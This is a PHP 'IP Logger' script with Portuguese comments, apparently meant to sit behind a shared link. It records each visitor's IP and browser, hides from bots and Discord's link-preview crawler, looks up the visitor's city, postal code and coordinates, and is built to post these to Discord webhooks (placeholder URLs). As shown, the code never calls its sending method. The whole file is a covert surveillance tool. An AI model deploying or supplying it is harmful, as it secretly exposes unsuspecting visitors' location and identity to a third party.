<?php
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];

if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}

// Você pode definir seu fuso horário aqui!. (Horário padrão de São Paulo - SP)
date_default_timezone_set("America/Sao_Paulo");
$Date = date('d/m/Y');
$Time = date('G:i:s');

// Verifica se o IP é uma VPN (nem sempre está correto!)
$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
if ($VPNConn->connection_type === "Corporate") {
    $VPN = "Yes";
} else {
    $VPN = "No";
}

// Configura algumas variáveis
$Country = $Details->country;
$CountryCode = $Details->countryCode;
$Region = $Details->regionName;
$City = $Details->city;
$Zip = $Details->zip;
$Lat = $Details->lat;
$Lon = $Details->lon;
$WebhookName = $IP;

class Discord
{
    // Isso será executado e enviado assim que a página carregar
    public function Visitor()
    {
        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;

        // Array de URLs de webhooks (Você pode adicionar quantos webhooks quiser, siga o exemplo abaixo)
        $Webhooks = array(
            "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
            
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",
        //  "https://discord.com/api/webhooks/0000000000000000000/Rj9xL2G5PsFQY1c6EhT3iVbnWzAaDk8XoMmUvfOZKP4pSl7BqeCItJuNHd0rywse_",

        );

        $InfoArr = array(
            "username" => "$WebhookName", // Nome do Webhook
            "avatar_url" => "https://media.discordapp.net/attachments/1111530895069949952/1111550532688031744/50077294.jpg", // Avatar do Webhook
            "embeds" => [array(

                "title" => "IP Logger", // Titulo da embed
                "url" => "https://github.com/zyrox68/IP-Logger", // Link do titulo da embed (opcional)
                "color" => "39423", // Cor do Webhook (Usar codigo hexadecimal)

                "fields" => [array(
                    "name" => "<:wifi:1128156254741745725> IP",
                    "value" => "`$IP`",
                    "inline" => true
                ),
                    array(
                        "name" => "• País",
                        "value"=> "`$Country | $CountryCode`",
                        "inline" => true
                    ),
                    array(
                        "name" => "• Região",
                        "value" => "`$Region | $City | $Zip`\n\n",
                    ),
                    array(
                        "name" => "\n\n\n",
                        "value" => "\n\n\n",
                    ),
                    array(
                        "name" => "<:browser:1128157480006983841>  Navegador",
                        "value" => "`$Browser`"
                    )
                ],

                "footer" => array(
                    "text" => "🕗 $Date $Time",
                ),
                "thumbnail" => array(
                    "url" => "https://media.discordapp.net/attachments/1111530895069949952/1111552182345543740/1448184200057.png"// Thumbnail da embed
                ),
            )],
        );

        $JSON = json_encode($InfoArr);

        $this->sendToWebhooks($Webhooks, $JSON);
    }

    public function sendToWebhooks($webhookUrls, $json)
    {
        foreach ($webhookUrls as $webhook) {
            $Curl = curl_init($webhook);
            curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
            curl_setopt($Curl, CURLOPT_POSTFIELDS, $json);
            curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
            curl_exec($Curl);
            curl_close($Curl);
        }
    }
}

$discord = new Discord();
?>